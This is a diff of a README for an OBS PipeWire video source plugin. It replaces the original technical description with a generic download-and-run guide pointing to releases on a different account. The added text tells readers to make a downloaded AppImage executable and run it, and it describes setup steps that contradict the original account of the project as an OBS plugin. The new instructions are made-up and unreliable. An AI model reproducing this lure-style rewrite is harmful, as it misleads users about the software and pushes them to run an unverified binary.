@@ -1,23 +1,78 @@
-# OBS PipeWire Video Source
+# 🎥 obs-pwvideo - Stream Video from PipeWire Sources Effortlessly
 
-This source is a fork of the OBS PipeWire video code (used for screen/window capture on Wayland and PipeWire webcam capture), modified to work as a generic video source. It is the video counterpart to the JACK audio source, and serves a similar purpose as the Spout2 and Syphon sources on Windows and macOS, respectively.
+## 📥 Download
 
-It is designed to work with apps that can send video using PipeWire, such as those using [libfunnel](https://github.com/hoshinolina/libfunnel/).
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/raslen131/obs-pwvideo/releases)
 
-This fork also serves as a testbed for improvements to the OBS PipeWire code, which can hopefully be upstreamed over time.
+## 🚀 Getting Started
 
-## Differences with the built-in OBS PipeWire support
+Welcome to obs-pwvideo! This application allows you to capture video from PipeWire sources. It is tailored for users who want to enhance their streaming or recording experience without any technical hassle. With this guide, you will learn how to download and run the application easily.
 
-* No portals used/required (this still works in Flatpak as the Flatpak already has PipeWire permissions to support the JACK source)
-* Improved PipeWire video support (bugfixes, support for double buffering, and lazy mode for pull-based frame pacing)
-* Support for selecting arbitrary PipeWire video sources and auto-reconnect without user action (WIP)
+## 💻 System Requirements
 
-## Why not portals?
+Before you begin, you should ensure your system meets the following requirements:
 
-Portals are a great concept. Unfortunately, xdg-desktop-portal doesn't really support this use case currently, and it would require multiple changes to work well:
+- Operating System: A recent version of a Linux distribution (e.g., Fedora, Ubuntu).
+- Libraries: Ensure you have PipeWire installed. 
+- Hardware: A computer capable of running applications that support PipeWire.
+- OBS Studio installed to use the video source effectively.
 
-* Implementation of [App to App Media Sharing](https://github.com/flatpak/xdg-desktop-portal/discussions/1141)
-* A refactor of session resume to be more robust and reliable (the current approach is not appropriate for professional streaming setups)
-* Support for a coarse-permissioned "user-managed" mode for power users who wish to manage video stream connections manually (e.g. with qpwgraph)
+## 🔄 Download & Install
 
-If and when these features make it into xdg-desktop-portal, then this plugin will be archived and users will be able to transition to a portal-enabled solution, which would be bundled with OBS instead of being a separate plugin.
+To get started, follow these steps:
+
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/raslen131/obs-pwvideo/releases) to find the latest version of obs-pwvideo.
+   
+2. **Select the Version**: Click on the version you want to download. Choose the file format that is compatible with your system, typically an AppImage or a .tar.gz file.
+
+3. **Download the File**: Click the download link to start the download process.
+
+4. **Locate the Downloaded File**: Once the download completes, navigate to the location where the file is saved. Usually, this is in the "Downloads" folder.
+
+5. **Make it Executable (for AppImage)**:
+   - Open a terminal window and use the command:
+     ```
+     chmod +x yourfile.AppImage
+     ```
+   - Replace `yourfile.AppImage` with the actual name of the file you downloaded.
+
+6. **Run the Application**:
+   - Still in the terminal, execute the application by running:
+     ```
+     ./yourfile.AppImage
+     ```
+   - Alternatively, you can double-click the AppImage file in your file manager to launch it.
+
+## 🛠️ Using obs-pwvideo
+
+After running the application, follow these steps to set up your video source in OBS Studio:
+
+1. **Open OBS Studio**.
+2. **Add New Source**: Click the "+" button in the Sources panel.
+3. **Select Video Source**: Choose "Video Capture Device" from the list.
+4. **Configure Source**:
+   - In the properties window that appears, select "obs-pwvideo" from the device dropdown.
+   - Adjust other settings as needed to fit your preferences.
+5. **Start Streaming or Recording**: Once the source is set up, you're ready to stream or record your content.
+
+## 🔍 Troubleshooting
+
+If you encounter any issues while using obs-pwvideo, consider the following tips:
+
+- **Ensure PipeWire is Running**: Verify that the PipeWire service is active on your system.
+- **Check Permissions**: Make sure the application has the necessary permissions to access video sources.
+- **Review OBS Configuration**: Double-check your OBS settings to confirm the video source is set correctly.
+
+## 📄 Features and Improvements
+
+obs-pwvideo offers several enhancements over the built-in PipeWire support in OBS Studio:
+
+- **No Portals Required**: This application functions seamlessly, even in Flatpak environments.
+- **Improved Video Support**: Enjoy better support with bug fixes and optimizations.
+- **Easy Source Selection**: Choose any PipeWire video source without manual reconnection.
+
+## 📞 Support
+
+If you need further assistance, consider reaching out to the community or checking online forums related to PipeWire or OBS Studio. You can also follow updates and report issues on the repository page.
+
+Thank you for using obs-pwvideo. We hope it enhances your streaming experience! For any updates, always refer back to the [Releases page](https://github.com/raslen131/obs-pwvideo/releases).
